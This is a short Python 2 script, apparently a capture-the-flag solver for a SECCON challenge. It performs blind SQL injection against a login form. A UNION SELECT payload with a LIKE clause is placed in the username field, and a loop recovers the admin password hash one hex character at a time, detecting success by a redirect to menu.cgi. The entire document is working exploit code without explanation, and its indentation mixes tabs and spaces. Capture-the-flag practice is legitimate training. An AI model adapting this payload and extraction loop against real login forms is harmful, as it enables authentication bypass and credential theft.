import requests, string

passwd = ""

for i in range(32):
    for c in string.hexdigits:
        q = "' UNION SELECT '83d069f7e011dc75b7c98e1c589c059d' FROM users WHERE username='admin' AND password LIKE '{}%'; -- "
        q = q.format(passwd + c)
    	x = requests.post("http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi?", data={
    	    'user': q,
            'pass': 'foo',
            'login': 'Login'
    	})
        if 'menu.cgi' in x.text:
            passwd += c
            print passwd
            break
    else:
        print 'asdf'
    